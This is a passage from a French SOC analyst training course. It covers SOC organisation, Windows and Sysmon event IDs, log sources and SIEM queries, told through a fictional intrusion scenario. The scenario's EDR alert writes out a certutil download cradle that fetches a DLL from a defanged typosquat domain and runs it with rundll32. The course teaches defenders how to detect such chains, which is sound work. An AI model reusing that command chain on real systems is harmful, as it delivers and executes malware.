---
title: Analyste SOC
source: Cyber/99_Concepts/Analyste_SOC.md
---

*Détecter • Investiguer • Répondre • Construire*

**Cours complet — 38 chapitres • 8 parties • 7 annexes**

*Logging • SIEM • Detection Engineering • Investigation • Threat Hunting • Réponse opérationnelle*

---

## Table des matières

- [Fil rouge : Opération FALCONWATCH](#fil-rouge-operation-falconwatch)
- **PARTIE I — FONDATIONS (Ch.1-4)**
  - [Ch.1 — Le SOC : mission, organisation et modèles](#chapitre-1-le-soc-mission-organisation-et-modeles)
  - [Ch.2 — Logging et télémétrie](#chapitre-2-logging-et-telemetrie)
  - [Ch.3 — Le SIEM : pipeline, langages et requêtes](#chapitre-3-le-siem-pipeline-langages-et-requetes)
  - [Ch.4 — L'écosystème d'outils au-delà du SIEM](#chapitre-4-lecosysteme-doutils-au-dela-du-siem)
- **PARTIE II — DÉTECTION (Ch.5-9)**
  - [Ch.5 — Principes de la détection](#chapitre-5-principes-de-la-detection)
  - [Ch.6 — MITRE ATT&CK pour le SOC](#chapitre-6-mitre-attck-pour-le-soc)
  - [Ch.7 — Detection Engineering : écrire des règles de qualité](#chapitre-7-detection-engineering-ecrire-des-regles-de-qualite)
  - [Ch.8 — YARA, Suricata et détection complémentaire](#chapitre-8-yara-suricata-et-detection-complementaire)
  - [Ch.9 — Détection cloud, SaaS et identités](#chapitre-9-detection-cloud-saas-et-identites)
- **PARTIE III — INVESTIGATION : MÉTHODES PAR DOMAINE (Ch.10-16)**
  - [Ch.10 — Principes de l'investigation SOC](#chapitre-10-principes-de-linvestigation-soc)
  - [Ch.11 — Investigation endpoint](#chapitre-11)
  - [Ch.12 — Investigation identité et Active Directory](#chapitre-12-qualification-categorisation-et-evaluation-de-gravite)
  - [Ch.13 — Investigation réseau](#chapitre-13-investigation-endpoint)
  - [Ch.14 — Investigation cloud et SaaS](#chapitre-14-investigation-identite-et-active-directory)
  - [Ch.15 — Construction de timeline multi-sources](#chapitre-15-investigation-reseau)
  - [Ch.16 — Pièges, faux positifs et erreurs d'investigation](#chapitre-16-investigation-cloud-et-saas)
- **PARTIE IV — USE CASES : SCÉNARIOS DE MENACE (Ch.17-21)**
  - [Ch.17 — Phishing et compromission de credentials](#chapitre-17-construction-de-timeline-multi-sources)
  - [Ch.18 — Mouvement latéral et escalade de privilèges](#chapitre-18-pieges-faux-positifs-et-erreurs-dinvestigation)
  - [Ch.19 — Exécution et persistence malveillante](#chapitre-19-phishing-et-compromission-de-credentials)
  - [Ch.20 — Exfiltration et communication C2](#chapitre-20-mouvement-lateral-et-escalade-de-privileges)
  - [Ch.21 — Ransomware : détection pré-déploiement et réponse](#chapitre-21-execution-et-persistence-malveillante)
- **PARTIE V — RÉPONSE OPÉRATIONNELLE (Ch.22-27)**
  - [Ch.22 — Playbooks et procédures de réponse](#chapitre-22-exfiltration-et-communication-c2)
  - [Ch.23 — Confinement : actions de premier niveau](#chapitre-23-ransomware-detection-pre-deploiement-et-reponse)
  - [Ch.24 — Communication, escalade et rédaction du ticket SOC](#chapitre-24-playbooks-et-procedures-de-reponse)
  - [Ch.25 — Collecte d'artefacts et préservation de preuves](#chapitre-25-confinement-actions-de-premier-niveau)
  - [Ch.26 — Post-incident : REX, tuning et amélioration](#chapitre-26-communication-escalade-et-redaction-du-ticket-soc)
  - [Ch.27 — Gestion d'un flux d'alertes : priorisation et endurance](#chapitre-27-collecte-dartefacts-et-preservation-de-preuves)
- **PARTIE VI — THREAT HUNTING (Ch.28-30)**
  - [Ch.28 — Fondamentaux du Threat Hunting](#chapitre-28-post-incident-rex-tuning-et-amelioration)
  - [Ch.29 — Techniques de hunting concrètes](#chapitre-29-gestion-dun-flux-dalertes-priorisation-et-endurance)
  - [Ch.30 — Purple teaming et validation de détection](#chapitre-30-fondamentaux-du-threat-hunting)
- **PARTIE VII — SOC AVANCÉ ET MATURITÉ (Ch.31-34)**
  - [Ch.31 — Automatisation SOC et SOAR](#chapitre-31-techniques-de-hunting-concretes)
  - [Ch.32 — Vulnerability Operations : le SOC et la réduction proactive du risque](#chapitre-32-purple-teaming-et-validation-de-detection)
  - [Ch.33 — Métriques SOC, reporting et maturité](#chapitre-33-automatisation-soc-et-soar)
  - [Ch.34 — Le SOC en 2026 : tendances et évolutions](#chapitre-34-vulnerability-operations-le-soc-et-la-reduction-proactive-du-risque)
- **PARTIE VIII — ÉTUDES DE CAS ET SYNTHÈSE (Ch.35-38)**
  - [Ch.35 — Cas complet : intrusion par phishing avec mouvement latéral et pré-ransomware](#chapitre-35-metriques-soc-reporting-et-maturite)
  - [Ch.36 — Cas complet : compromission de compte M365 avec BEC](#chapitre-36-le-soc-en-2026-tendances-et-evolutions)
  - [Ch.37 — Cas complet : threat hunt sur les LOLBins](#chapitre-37-cas-complet-intrusion-par-phishing-avec-mouvement-lateral-et-pre-ransomware-synthese-falconwatch)
  - [Ch.38 — Cas complet : 8 heures d'un analyste SOC — la réalité du shift](#chapitre-38-cas-complet-compromission-de-compte-m365-avec-bec)
- **ANNEXES**
  - [Annexe A — Glossaire SOC](#annexe-a-glossaire-soc)
  - [Annexe B — Event IDs Windows : référence rapide](#annexe-b-event-ids-windows-reference-rapide)
  - [Annexe C — Cheat sheets requêtes SIEM](#annexe-c-cheat-sheets-requetes-siem)
  - [Annexe D — Règles Sigma de référence](#annexe-d-regles-sigma-de-reference)
  - [Annexe E — Templates SOC](#annexe-e-templates-soc)
  - [Annexe F — Playbooks de référence](#annexe-f-playbooks-de-reference)
  - [Annexe G — Ressources et formation](#annexe-g-ressources-et-formation)

---

## Fil rouge : Opération FALCONWATCH

> **Contexte narratif — ce fil rouge traverse les 34 premiers chapitres et se conclut au Ch.35.**
>
> **Karim Belkacem**, analyste SOC L2 chez **CyberShield** — MSSP français, SOC 24/7, 40 analystes, 120 clients ETI et grands groupes — travaille le shift du matin (6h-14h) quand une alerte critique remonte sur le tenant d'un client majeur : **Norexia**, groupe industriel français spécialisé en chimie fine, 3 200 collaborateurs, 4 sites en France et Belgique, classé OIV sur 2 sites de production.
>
> **L'alerte :** lundi 10 mars 2026, 07h42 UTC. L'EDR CrowdStrike Falcon détecte sur le poste WKS-PROD-112 (Windows 11, département production, utilisateur : Marc Dubois, ingénieur de production) la séquence suivante : `WINWORD.EXE → cmd.exe → certutil.exe -urlcache -split -f hxxps://update-norexia[.]xyz/lib.dll C:\Users\Public\lib.dll → rundll32.exe C:\Users\Public\lib.dll,DllMain`. La détection est classée « Critical » par le Falcon : chaîne de parenté caractéristique d'un document Office malveillant avec download cradle via certutil et exécution de DLL non signée.
>
> Ce qui semble être une alerte de phishing classique va se révéler être le début d'une intrusion sophistiquée. L'investigation de Karim va découvrir, couche après couche : un phishing ciblé envoyé depuis le compte compromis d'un sous-traitant de maintenance (les credentials VPN du sous-traitant avaient été volées par un infostealer 3 semaines plus tôt et vendues sur Russian Market), un RAT custom avec beaconing HTTPS toutes les 45 secondes vers un C2 hébergé sur un VPS aux Pays-Bas, un mouvement latéral via PsExec vers un second poste (WKS-IT-045, poste d'un admin IT), un Kerberoasting ciblant 8 comptes de service dont `svc-scada` (accès aux systèmes de supervision industrielle), un staging de données R&D (formulations chimiques propriétaires) via rclone vers un bucket S3, et les prémices d'un déploiement ransomware (les shadow copies ont été supprimées sur 3 machines, et un binaire BlackBasta a été identifié dans le staging directory — non encore exécuté).
>
> L'intrusion couvre 48 heures (du phishing initial samedi matin à la détection lundi matin). La détection par l'EDR sur le certutil + rundll32 arrive à la « golden hour » — le moment critique entre la fin du mouvement latéral et le déploiement du ransomware. Chaque heure compte.
>
> L'équipe mobilisée : Karim (investigation L2), **Leïla Farah** (L1, triage initial et scope assessment), **Antoine Roche** (L3/detection engineer, écriture des détections post-incident), et **Sofia Leclerc** (CTI, contextualisation de la menace — personnage du cours CTI de la bibliothèque, ici en rôle de support).

---

## PARTIE I — FONDATIONS

*Avant de détecter et d'investiguer : comprendre ce qu'est un SOC, ce qui le nourrit (les logs), avec quels outils il opère, et comment ces outils s'articulent.*

---

### Chapitre 1 — Le SOC : mission, organisation et modèles

#### 1.1 Définition opérationnelle

Le Security Operations Center est la structure qui assure la surveillance, la détection, l'investigation et la réponse aux incidents de sécurité en continu. Sa mission se résume en trois verbes : **détecter** (transformer les logs et les alertes en signaux exploitables), **investiguer** (comprendre ce qui s'est passé, avec quelle certitude), et **répondre** (contenir la menace, éradiquer, et restaurer).

Le SOC ne fait pas tout et c'est important de le poser d'emblée. Il ne définit pas la politique de sécurité (c'est le RSSI), ne réalise pas de tests d'intrusion (c'est le pentest/red team), ne gère pas les vulnérabilités au quotidien (c'est le vulnerability management, même si les frontières bougent — Ch.32), et ne mène pas les investigations forensiques approfondies (c'est le CERT/forensicien, traité dans le cours Forensic de la bibliothèque). Le SOC est le système nerveux central de la sécurité opérationnelle — il capte les signaux, les interprète, et déclenche les réponses de premier niveau.

#### 1.2 Le modèle L1/L2/L3 — et ses évolutions

Le modèle classique organise le SOC en trois niveaux.

Le **L1 (Triage)** est le premier contact avec l'alerte. L'analyste L1 qualifie rapidement chaque alerte : vrai positif (VP — une menace réelle), faux positif (FP — alerte sans menace), benign true positive (BTP — l'alerte est techniquement correcte mais l'action est légitime), ou inconclusive (doute — nécessite investigation approfondie). Le L1 enrichit l'alerte (lookup IP, hash, utilisateur), applique le playbook de réponse si la qualification est claire, et escalade au L2 si l'investigation dépasse le triage. Compétences clés : lecture rapide de logs, connaissance des use cases, application des playbooks, rapidité de qualification.

Le **L2 (Investigation)** mène les investigations approfondies. L'analyste L2 reconstitue la séquence d'événements (timeline), corrèle les sources (endpoint + réseau + identité + cloud), pivote entre les entités (IP → hostname → user → process → hash), formule des hypothèses, et produit la conclusion argumentée. Le L2 exécute aussi les actions de confinement de premier niveau (isolation endpoint, blocage IoC, reset credentials). Compétences clés : pivoting, requêtes SIEM avancées, compréhension des TTP, raisonnement analytique.

Le **L3 (Expert)** couvre les fonctions avancées : detection engineering (écriture et maintenance des règles de détection), threat hunting (recherche proactive de menaces non détectées), forensique de premier niveau (collecte d'artefacts, analyse de malware first-pass), et purple teaming (validation des détections avec le red team).

**Ce modèle est pédagogiquement utile mais pas universel.** De nombreux SOC modernes adoptent des organisations différentes, mieux adaptées à leur contexte.

Le modèle **par rôle spécialisé** remplace les niveaux par des fonctions : des **analystes généralistes** (qui trient ET investiguent, sans séparation L1/L2 — souvent plus satisfaisant pour les analystes et plus efficace car l'investigateur a le contexte depuis le début), des **detection engineers** (qui écrivent, testent et maintiennent les règles — un rôle de plus en plus identifié et valorisé), des **hunters** (recherche proactive dédiée), des **incident responders** (réponse et confinement), et des **content engineers** (gestion du SIEM — parsing, normalisation, data quality).

Le modèle **squad/pod** organise de petites équipes pluridisciplinaires (1 detection engineer + 2-3 analystes + 1 hunter) assignées à un périmètre client ou technologique, avec une autonomie opérationnelle forte.

Le modèle **follow-the-sun** distribue les shifts entre plusieurs fuseaux horaires (SOC Paris 6h-14h, SOC Montréal 14h-22h, SOC Singapour 22h-6h) — chaque site travaille en journée plutôt qu'en nuit.

La tendance 2025-2026 est à la spécialisation par rôle (detection engineering et hunting comme fonctions distinctes) et à la réduction de la séparation L1/L2 (les analystes « full-stack » qui trient et investiguent sont plus efficaces et plus motivés que les L1 cantonnés au triage).

#### 1.3 Les modèles de SOC

**SOC interne :** géré par l'entreprise. Avantage : connaissance fine du contexte métier (l'analyste connaît les processus, les utilisateurs, les applications). Inconvénient : coût (recrutement, formation, 24/7), difficulté à recruter et retenir les talents.

**SOC externalisé (MSSP) :** sous-traité à un prestataire de services managés. Avantage : mutualisation des coûts, expertise partagée, 24/7 natif. Inconvénient : moindre connaissance du contexte client (l'analyste MSSP gère 10-20 clients et ne connaît pas les spécificités métier de chacun).

**MDR (Managed Detection & Response) :** service managé combinant EDR + analystes. Le fournisseur MDR gère la détection et la réponse initiale (triage, confinement). Le client conserve la décision finale sur les actions impactantes. Avantage : rapidité de déploiement, expertise EDR native. Inconvénient : périmètre limité (souvent endpoint-centric, peu de corrélation avec les logs réseau, AD, ou cloud).

**Hybride :** le modèle le plus courant en 2025-2026. Le triage et la surveillance 24/7 sont externalisés (volume, nuits, week-ends), l'investigation L2/L3, le detection engineering, et le hunting sont internes (contexte, expertise, valeur ajoutée).

#### 1.4 Les interactions du SOC

Le SOC n'opère pas en silo — il interagit avec toute l'organisation sécurité. Avec le **CERT/CSIRT** : escalade des incidents confirmés nécessitant une investigation approfondie, coordination de la réponse aux incidents majeurs, partage d'IoC. Avec le **RSSI** : reporting des métriques et des incidents, gouvernance des règles de détection, validation des exceptions. Avec l'**IT/Infra** : exécution des actions de confinement (isolation réseau, désactivation de compte), collecte de logs supplémentaires, patching coordonné. Avec la **CTI** : consommation des IoC et des TTP (feeds → SIEM), feedback sur les détections (FP, gaps), et contextualisation des incidents (cours CTI de la bibliothèque). Avec le **NOC** : corrélation des événements réseau, distinction entre incident de sécurité et incident de disponibilité. Avec les **métiers** : signalement d'activités suspectes, validation de la légitimité d'une action (« est-ce vous qui avez transféré ces fichiers vers Google Drive ? »).

#### 1.5 Fil rouge — FALCONWATCH : le contexte

> **🛡️ FALCONWATCH — Épisode 1**
>
> Lundi 10 mars 2026, 07h42 UTC. Karim arrive à son poste de travail dans le SOC CyberShield (open space sécurisé, 8 analystes par shift, 4 écrans par poste — SIEM, EDR, ticketing, communication). Il prend le handover du shift de nuit : « Nuit calme, 12 alertes traitées, 0 escalade, backlog à 3 alertes en attente de contexte client. » Karim ouvre le dashboard CrowdStrike et voit immédiatement l'alerte rouge sur le tenant Norexia. Sévérité : Critical. Technique ATT&CK : T1218.011 (Rundll32) + T1105 (Ingress Tool Transfer). Machine : WKS-PROD-112. Il commence le triage.

---

### Chapitre 2 — Logging et télémétrie

#### 2.1 Pourquoi les logs sont le carburant du SOC

Sans logs, pas de détection, pas d'investigation, pas de preuve. Chaque alerte du SIEM est construite à partir de logs. Chaque investigation pivote entre des logs de sources différentes. Chaque conclusion est étayée par des événements horodatés dans les logs. L'objectif fondamental est de répondre à trois questions : **qui** a fait **quoi**, **quand** ?

La qualité de la détection est directement proportionnelle à la qualité et à la couverture des logs. Un SOC avec un SIEM de 500 000 €/an mais des logs Windows limités au Security Log par défaut (sans Sysmon, sans commande line logging) détectera moins qu'un SOC avec un SIEM open source et une télémétrie riche. L'investissement dans le logging est le meilleur investissement en détection.

#### 2.2 Sources Windows — les Event IDs essentiels

Le Security Log est la source primaire pour l'authentification et l'audit de sécurité.

**Event ID 4624 (Successful Logon) :** chaque authentification réussie, avec le type de logon. Les types critiques pour le SOC : Type 2 (Interactive — login physique), Type 3 (Network — accès à un partage, PsExec, WMI), Type 7 (Unlock — déverrouillage de session), Type 10 (RemoteInteractive — RDP). Le 4624 contient le nom du compte, le domaine, l'IP source (pour les logons réseau), et le processus d'authentification (NTLM vs Kerberos). Un 4624 Type 3 depuis un poste de travail lambda vers un serveur critique à 3h du matin est un signal de mouvement latéral. FP courant : les comptes de service qui s'authentifient massivement en Type 3 — à baseliner.

**Event ID 4625 (Failed Logon) :** chaque échec d'authentification. Une rafale de 4625 avec des comptes variés depuis une même source est un password spraying. Le sous-status code précise la raison (0xC0000064 = compte inexistant, 0xC000006A = mot de passe incorrect, 0xC0000234 = compte verrouillé). FP courant : les applications mal configurées qui tentent de s'authentifier en boucle avec des credentials expirés.

**Event ID 4648 (Logon with Explicit Credentials) :** un processus s'authentifie avec des credentials différentes de celles de la session (runas, PsExec avec -u, pass-the-hash). Signal de mouvement latéral ou d'utilisation de credentials volées.

**Event ID 4672 (Special Privileges Assigned) :** attribution de privilèges administratifs lors d'un logon. Un 4672 pour un compte utilisateur standard est suspect.

**Event ID 4688 (Process Creation) :** création de processus avec (si la GPO est activée — et elle DOIT l'être) la ligne de commande complète. C'est l'Event ID le plus riche pour la détection d'exécution suspecte. Sans l'activation du command line logging (GPO « Include command line in process creation events »), le 4688 est beaucoup moins utile — c'est la première recommandation de « forensic readiness » pour le SOC.

**Event ID 7045 (Service Installed) :** installation d'un nouveau service. PsExec crée le service PSEXESVC. Les malwares installent des services pour la persistence. Un 7045 avec un nom de service inhabituel ou un chemin d'exécutable dans un répertoire temporaire mérite investigation.

**Event ID 4769 (Kerberos Service Ticket Requested) :** avec encryption type 0x17 (RC4), c'est la signature du Kerberoasting. Un volume élevé de 4769 RC4 depuis une seule machine est un signal critique.

**Event ID 4698 (Scheduled Task Created) :** création d'une tâche planifiée — mécanisme de persistence courant.

**Event ID 1102 (Security Log Cleared) :** effacement du Security Log — l'acte de nettoyage produit ironiquement son propre événement. Signal d'anti-forensics.

#### 2.3 Sysmon — le game changer de la télémétrie

Sysmon (System Monitor, Microsoft Sysinternals) est l'outil de télémétrie le plus impactant que le SOC puisse déployer. Il produit des Event IDs riches qui comblent les lacunes du Security Log natif.

**Event 1 (Process Create) :** plus détaillé que le 4688 — hash du binaire, ligne de commande complète, processus parent complet (pas juste le PID — le nom et le chemin du parent). C'est LA source pour la détection d'exécution suspecte.

**Event 3 (Network Connection) :** quel processus se connecte à quelle IP et sur quel port. Absent des logs Windows natifs — sans Sysmon Event 3, le SOC ne sait pas quel processus communique avec le C2.

**Event 7 (Image Loaded) :** DLL chargées par un processus — détection de DLL sideloading et de DLL injection.

**Event 10 (Process Access) :** accès d'un processus à un autre — détection d'accès à LSASS (credential dumping).

**Event 11 (File Create) :** fichiers créés — détection de drops de malware, de staging de données.

**Event 22 (DNS Query) :** résolutions DNS par processus — quel processus résout quel domaine. Essentiel pour la corrélation processus → réseau.

La configuration Sysmon est critique : la configuration par défaut est trop verbeuse (elle génère des millions d'événements par jour). La configuration **SwiftOnSecurity** (GitHub) est la base recommandée — elle filtre le bruit tout en conservant les événements de haute valeur. L'ajustement pour l'environnement spécifique (exclusion des applications bruyantes mais légitimes) est un travail continu du detection engineer.

#### 2.4 Sources réseau

Les **logs firewall** (Palo Alto, Fortinet, Check Point) montrent les flux autorisés et refusés avec IP source, IP destination, port, protocole, et volume. Ils répondent à la question « qui parle à qui ». Utilité SOC : identifier les communications inhabituelles (destinations rares, ports non standard, volumes anormaux), détecter les scans, et quantifier les flux sortants (exfiltration).

Les **logs proxy** (Zscaler, Squid, Blue Coat) montrent le contenu applicatif : URL complète, user-agent, catégorie du site, méthode HTTP (GET/POST), et volume de données. Ils voient au-delà du firewall — le firewall voit « connexion HTTPS vers 1.2.3.4:443 », le proxy voit « POST vers hxxps://mega.nz/upload avec 2 Go de données ». Utilité SOC : identifier le C2 web, l'exfiltration vers des services de partage, et les téléchargements suspects.

Les **logs DNS** (Infoblox, Windows DNS, BIND, Pi-hole, résolveurs cloud) montrent les résolutions de domaine. Utilité SOC : identifier les domaines DGA (Domain Generation Algorithm — domaines aléatoires caractéristiques des botnets), le DNS tunneling (données encodées dans les sous-domaines), et les résolutions vers des C2 connus.

Les **logs VPN** (Fortinet, Cisco, Palo Alto GlobalProtect, Ivanti/Pulse Secure) montrent les connexions avec IP source, géolocalisation, horodatage, et durée. Utilité SOC : détecter l'impossible travel (connexion depuis Paris et Hong Kong à 1h d'intervalle), les connexions depuis des géographies inhabituelles, et l'utilisation de credentials compromises.

Les **NetFlow** (métadonnées de flux sans le contenu — source, destination, port, volume, durée) sont disponibles sur les routeurs et les switches. Utilité SOC : analyse de volume à grande échelle, détection de beaconing, et cartographie des communications internes inhabituelles.

#### 2.5 Sources cloud et SaaS

En 2025-2026, les sources cloud sont devenues aussi critiques que les sources endpoint.

**Azure AD / Entra ID Sign-in Logs :** chaque authentification vers les services Microsoft (M365, Azure, applications SAML/OIDC) avec IP source, géolocalisation, device info, résultat de la conditional access policy, méthode MFA utilisée, et risk level. C'est la source primaire pour la détection des compromissions d'identité cloud.

**Microsoft 365 Unified Audit Log (UAL) :** chaque action dans M365 — emails envoyés/reçus, fichiers accédés/partagés dans SharePoint/OneDrive, règles Outlook créées/modifiées, applications ajoutées, et permissions changées. C'est la source primaire pour la détection des BEC (Business Email Compromise) et des exfiltrations cloud.

**AWS CloudTrail :** chaque appel API AWS — création d'instances, modification de security groups, accès aux buckets S3, modifications IAM. Chaque action dans AWS passe par une API et CloudTrail l'enregistre.

#### 2.6 Synchronisation horaire et fuseaux

Toutes les sources de logs doivent être synchronisées via NTP (Network Time Protocol) et tous les timestamps doivent être convertis en **UTC** avant corrélation. Sans synchronisation, la timeline multi-sources est fausse — un événement firewall en UTC et un événement proxy en heure locale Paris (UTC+1 ou UTC+2 selon la saison) créent un décalage de 1-2 heures qui rend la corrélation impossible. C'est le piège n°1 de l'investigation SOC.

#### 2.7 Fil rouge — FALCONWATCH : ce que les logs montrent

> **🛡️ FALCONWATCH — Épisode 2**
>
> L'alerte EDR fournit le process tree : `WINWORD.EXE (PID 8412) → cmd.exe (PID 9201) → certutil.exe (PID 9215, args: -urlcache -split -f hxxps://update-norexia[.]xyz/lib.dll C:\Users\Public\lib.dll) → rundll32.exe (PID 9284, args: C:\Users\Public\lib.dll,DllMain)`. Karim note immédiatement : certutil avec -urlcache est un LOLBin classique (T1105 Ingress Tool Transfer), et le domaine `update-norexia[.]xyz` est un typosquatting du domaine légitime de Norexia. Le parent winword.exe confirme un document Office piégé.
>
> Karim vérifie les logs Sysmon (collectés dans le SIEM Splunk) : Event 1 confirme la chaîne de processus avec les hash de chaque binaire. Event 3 montre que rundll32.exe (PID 9284) établit une connexion HTTPS vers `185.xx.xx.xx:443` — le C2. Event 22 montre la résolution DNS de `update-norexia[.]xyz` vers `185.xx.xx.xx` par le processus certutil. Les logs proxy confirment le download de lib.dll (2.4 Mo, HTTPS, certificat Let's Encrypt émis 48h plus tôt).

---

### Chapitre 3 — Le SIEM : pipeline, langages et requêtes

*Ce chapitre traite le SIEM du point de vue de l'analyste — pas de l'architecte. L'objectif est de comprendre le pipeline (comment les logs deviennent des alertes), de maîtriser les langages de requête (pour investiguer), et de connaître les différences opérationnelles entre les SIEM majeurs (pour s'adapter rapidement à un nouvel environnement).*

#### 3.1 Le pipeline SIEM

Le SIEM transforme des flux de logs bruts en alertes contextualisées. Le pipeline comprend 7 étapes.

La **collecte/ingestion** reçoit les logs depuis les sources via des agents (Splunk Forwarder, Elastic Agent, Beats), des protocoles réseau (syslog, SNMP), ou des APIs (connecteurs cloud). La **parsing** extrait les champs structurés du log brut (l'IP source, l'utilisateur, l'action, le résultat) à partir du texte brut — par regex, Grok patterns, ou parsers prédéfinis. La **normalisation** uniformise les noms de champs entre les sources (le champ « src_ip » dans une source, « SourceAddress » dans une autre, « srcip » dans une troisième → tous mappés vers un nom unique). Sans normalisation, la corrélation multi-sources est impossible. L'**enrichissement** ajoute du contexte (IP → géolocalisation + ASN + réputation, hostname → criticité depuis la CMDB, hash → score VirusTotal, utilisateur → département + niveau de privilège). L'**indexation** stocke les événements normalisés et enrichis pour une recherche rapide. La **corrélation** applique les règles de détection sur les événements indexés (une rafale de 4625 + un 4624 réussi depuis la même IP = brute force réussie). L'**alerting** génère une alerte quand les conditions d'une règle sont remplies, avec la sévérité, le contexte, et les entités concernées.

Le problème de la qualité du pipeline : si le parsing est mal configuré (un champ IP non extrait), la normalisation échoue, l'enrichissement est incomplet, et la corrélation ne matche pas — l'alerte ne se déclenche jamais. Le « data quality » est un enjeu permanent du SOC.

#### 3.2 Splunk (SPL)

Splunk est le SIEM le plus répandu en entreprise. Son langage de requête — **SPL** (Search Processing Language) — est basé sur des pipes : chaque commande transforme les résultats et les passe à la suivante.

Requêtes essentielles pour l'analyste :

```
# Brute force : rafale de logons échoués par IP
index=windows EventCode=4625 
| stats count by src_ip, user 
| where count > 10 
| sort -count

# Process suspect : PowerShell encodé
index=sysmon EventCode=1 Image="*\\powershell.exe" CommandLine="*-enc*" 
| table _time host user CommandLine ParentImage

# Timeline utilisateur : toute l'activité d'un user
index=* user="marc.dubois" earliest=-24h 
| sort _time 
| table _time index sourcetype action src_ip dest_ip

# Connexions vers un C2 connu
index=firewall dest_ip="185.xx.xx.xx" 
| stats count values(src_ip) by dest_port 
| sort -count

# Beaconing : connexions régulières vers une destination
index=proxy dest="185.xx.xx.xx" 
| sort _time 
| streamstats current=f last(_time) as prev_time by src_ip 
| eval interval=_time-prev_time 
| stats avg(interval) stdev(interval) count by src_ip dest
```

Splunk ES (Enterprise Security) ajoute une couche SOC avec les **notable events** (alertes qualifiées), le **risk-based alerting** (agrégation de signaux faibles sur une entité — un utilisateur qui accumule des scores de risque dépasse un seuil et déclenche une alerte composite), les **investigations** (workspace collaboratif pour documenter les investigations), et les **data models** (CIM — Common Information Model, couche d'abstraction qui normalise les champs).

#### 3.3 Elastic SIEM (KQL / EQL)

Elastic SIEM (Elastic Security) est la solution open-core basée sur la stack Elasticsearch + Kibana. Trois langages de requête coexistent.

**KQL** (Kibana Query Language) — simple, utilisé dans la barre de recherche :
```
event.code: "4625" and source.ip: 10.0.0.*
process.name: "powershell.exe" and process.args: "-enc"
```

**EQL** (Event Query Language) — le plus puissant pour les séquences d'événements (détection de chaînes d'attaque) :
```
sequence by host.name with maxspan=5m
  [process where process.name == "winword.exe"]
  [process where process.name == "cmd.exe" and process.parent.name == "winword.exe"]
  [process where process.name == "certutil.exe" and process.args : "*urlcache*"]
```

**ES|QL** — nouveau langage SQL-like :
```
FROM logs-* | WHERE event.code == "4625" | STATS count = COUNT(*) BY source.ip | WHERE count > 10
```

Elastic Security intègre des detection rules pré-construites mappées ATT&CK, un timeline view pour l'investigation, et un case management intégré.

#### 3.4 Microsoft Sentinel (KQL Kusto)

Sentinel est le SIEM cloud-native de Microsoft, intégré à Azure. Son langage — **KQL** (Kusto Query Language, distinct du KQL Kibana) — est particulièrement puissant pour les agrégations et les jointures.

```
// Brute force réussi
SecurityEvent
| where EventID == 4625
| summarize FailCount=count() by TargetAccount, IpAddress
| where FailCount > 10
| join kind=inner (
    SecurityEvent | where EventID == 4624
) on TargetAccount, IpAddress

// Impossible travel
SigninLogs
| where ResultType == 0
| summarize by UserPrincipalName, IPAddress, Location, TimeGenerated
| sort by UserPrincipalName, TimeGenerated asc
```

Sentinel excelle dans les environnements Microsoft (connecteurs natifs M365, Azure, Defender) et propose des **analytics rules** (scheduled, NRT — near real-time, fusion — corrélation ML), des **workbooks** (dashboards), des **hunting queries** (KQL pour le hunting), et des **playbooks** via Logic Apps (SOAR intégré).

#### 3.5 Comparaison opérationnelle pour l'analyste

Ce qui compte pour l'analyste au quotidien — pas pour l'architecte :

| Critère | Splunk | Elastic | Sentinel |
|---------|--------|---------|----------|
| Langage | SPL (pipe-based, très expressif) | KQL + EQL + ES\|QL (multiple) | KQL Kusto (SQL-like, puissant) |
| Force | Puissance SPL, écosystème mature, Splunk ES | EQL pour les séquences, open-core | Intégration Microsoft native, cloud |
| Faiblesse | Coût élevé (volume-based) | Complexité multi-langage | Azure only, dépendance cloud |
| EDR natif | Non (intégration via add-ons) | Elastic Defend | Microsoft Defender for Endpoint |
| SOAR natif | Splunk SOAR (séparé) | Via TheHive/Cortex | Logic Apps (intégré) |
| Transition | Si vous connaissez SPL, KQL s'apprend en 1 semaine | Si vous connaissez EQL, les séquences Sigma sont naturelles | Si vous connaissez SQL, KQL Kusto est intuitif |

L'analyste SOC moderne doit idéalement maîtriser **SPL + au moins un des deux KQL** (Kibana ou Kusto, selon l'environnement). Les annexes C fournissent les requêtes les plus courantes dans les 3 langages.

---

### Chapitre 4 — L'écosystème d'outils au-delà du SIEM

#### 4.1 EDR — la visibilité endpoint

L'EDR (Endpoint Detection and Response) est l'outil le plus important pour l'analyste SOC après le SIEM. Il offre une visibilité granulaire sur chaque endpoint (processus, fichiers, réseau, registre) et des capacités de réponse (isolation, quarantaine, collecte d'artefacts).

**CrowdStrike Falcon** : leader marché, cloud-native, threat intelligence intégrée. Le process tree est le cœur de l'investigation : chaque alerte montre la chaîne complète des processus avec les connexions réseau, les fichiers créés, et les modifications de registre. Langage de requête : Event Search (SPL-like). Réponse : containment réseau, Real Time Response (shell distant sur l'endpoint — attention aux droits, ce n'est pas pour tout le monde).

**SentinelOne** : autonome (IA locale pour la détection et la réponse automatique), Storyline (reconstruction automatique de la chaîne d'attaque). Langage : Deep Visibility (SQL-like). Réponse : rollback (restauration de l'état pré-attaque — unique à SentinelOne, utile pour les ransomwares).

**Microsoft Defender for Endpoint (MDE)** : intégration native avec Sentinel, M365, et Intune. Langage : KQL via Advanced Hunting. Très performant dans les environnements Microsoft. Réponse : isolation, collecte d'investigation package, live response.

#### 4.2 NDR, SOAR, UEBA et outils complémentaires

Le **NDR** (Network Detection and Response — Darktrace, Vectra, Corelight/Zeek) offre une visibilité réseau qui complète l'EDR : détection de beaconing, analyse de trafic chiffré par métadonnées (JA3/JA4, taille des paquets, intervalles), et mouvement latéral réseau.

Le **SOAR** (Security Orchestration, Automation and Response — Cortex XSOAR, Splunk SOAR, TheHive + Cortex, Tines, Shuffle) automatise les actions répétitives : enrichissement d'alerte, création de ticket, blocage d'IoC, isolation d'endpoint. Le SOAR est le multiplicateur d'efficacité du SOC — traité en profondeur au Ch.31.

L'**UEBA** (User and Entity Behavior Analytics) établit des baselines d'activité normale et détecte les anomalies (connexion à une heure inhabituelle, accès à un volume de données anormal, changement de comportement). Forces : détection d'anomalies sans règle prédéfinie. Limites : beaucoup de FP si la baseline est mal calibrée, courbe d'apprentissage longue, tendance à l'excès d'alertes.

Les **TIP** (MISP, OpenCTI) gèrent les feeds CTI et injectent les IoC dans le SIEM. Les **sandbox** (ANY.RUN, Joe Sandbox, Hybrid Analysis) analysent dynamiquement les fichiers suspects. **Velociraptor** (open source) permet la collecte forensic et le hunting à distance via VQL sur l'ensemble du parc — c'est l'outil de prédilection du L3 et du hunter.

#### 4.3 Fil rouge — FALCONWATCH : les outils mobilisés

> **🛡️ FALCONWATCH — Épisode 3**
>
